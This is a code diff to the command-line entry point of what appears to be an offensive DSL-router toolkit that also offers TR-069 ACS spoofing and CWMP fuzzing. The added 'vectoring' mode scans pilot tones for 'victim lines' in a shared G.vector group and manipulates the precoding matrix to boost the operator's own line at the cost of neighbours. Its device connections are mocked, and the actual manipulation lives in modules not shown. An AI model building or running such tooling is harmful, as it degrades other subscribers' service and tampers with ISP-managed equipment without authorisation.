@@ -10,6 +10,11 @@ from src.exploit_pipeline import ExploitPipeline
 from src.tr069.acs_spoofer import ACSSpoofer
 from src.tr069.client_emulator import CpeEmulator
 from src.tr069.fuzzer import CwmpFuzzer
+from src.database_manager import DatabaseManager
+from src.hal.broadcom import BroadcomDslHal
+from src.vectoring_analyzer import VectoringAnalyzer
+from src.vectoring_manipulator import VectoringManipulator
+from src.entware_ssh import EntwareSSHInterface
 
 def run_pipeline(args):
     """Runs the main exploitation pipeline."""
@@ -33,6 +38,57 @@ def run_pipeline(args):
     except Exception as e:
         logging.critical(f"A critical error occurred in the pipeline: {e}", exc_info=True)
         print(f"❌ Pipeline execution failed. See logs for details.")
+
+def run_vectoring_exploit(args):
+    """Runs the G.vector precoding matrix exploit."""
+    print("🚀 Initializing G.vector Exploitation Subsystem 🚀")
+    print(f"Targeting line index: {args.our_line_index} with benefit factor: {args.benefit_factor}")
+
+    # --- Setup ---
+    # In a real scenario, we would establish a real SSH connection.
+    # For now, we use a mock to avoid requiring live credentials.
+    ssh_interface = MagicMock(spec=EntwareSSHInterface)
+    ssh_interface.execute_command.return_value = ("", "") # Default mock behavior
+
+    db_manager = DatabaseManager('src/vendor_signatures.json')
+    vendor_signatures = db_manager.get_all_signatures()
+
+    # This assumes a Broadcom chipset. A real implementation would need detection logic.
+    hal = BroadcomDslHal(ssh_interface, vendor_signatures)
+
+    # The dsl_interface would be a more complex object responsible for providing the HAL.
+    # For this entry point, we create a simple mock that returns our HAL.
+    dsl_interface = MagicMock()
+    dsl_interface.get_hal.return_value = hal
+
+    analyzer = VectoringAnalyzer(ghs_analyzer=None, dsl_interface=dsl_interface, signatures=vendor_signatures)
+    manipulator = VectoringManipulator(hal=hal)
+
+    # --- Execution ---
+    print("\nStep 1: Analyzing pilot tones to find victim lines...")
+    # In a real run, the HAL would read from the device. The following call
+    # will likely fail or return nothing without a live device and populated debugfs.
+    analysis_result = analyzer.analyze_pilot_sequences()
+    if not analysis_result or not analysis_result.get("victim_lines"):
+        print("✅ No significant victim lines detected or analysis failed. No action taken.")
+        return
+
+    victim_lines = analysis_result.get("victim_lines")
+    print(f"✅ Analysis complete. Identified potential victim lines: {victim_lines}")
+
+    print("\nStep 2: Manipulating precoding matrix to maximize our line's benefit...")
+    success = manipulator.maximize_line_benefit(
+        our_line_index=args.our_line_index,
+        victim_lines=victim_lines,
+        benefit_factor=args.benefit_factor
+    )
+
+    if success:
+        print("✅ Precoding matrix manipulation command sent.")
+    else:
+        print("❌ Failed to manipulate precoding matrix.")
+
+    print("\n🎉 Vectoring exploit run finished. 🎉")
 
 def run_acs_spoofer(args):
     """Runs the TR-069 ACS Spoofer."""
@@ -92,6 +148,13 @@ def main():
     parser_pipeline.add_argument('--signal-boost', type=int, default=None, help='Apply a fake signal boost in dB.')
     parser_pipeline.add_argument('--pilot-power', type=int, default=None, help='Set the pilot tone power in dBm.')
     parser_pipeline.set_defaults(func=run_pipeline)
+
+    # Vectoring Exploit mode
+    parser_vectoring = subparsers.add_parser('vectoring', help='Run the G.vector precoding matrix exploit.')
+    parser_vectoring.add_argument('target_ip', help='The IP address of the target device (used for context).')
+    parser_vectoring.add_argument('--our-line-index', type=int, default=0, help='The index of our line in the vectoring group.')
+    parser_vectoring.add_argument('--benefit-factor', type=float, default=0.9, help='Factor to adjust our crosstalk by (0.0-1.0).')
+    parser_vectoring.set_defaults(func=run_vectoring_exploit)
 
     # ACS Spoofer mode
     parser_acs = subparsers.add_parser('acs', help='Run the TR-069 ACS Spoofer.')
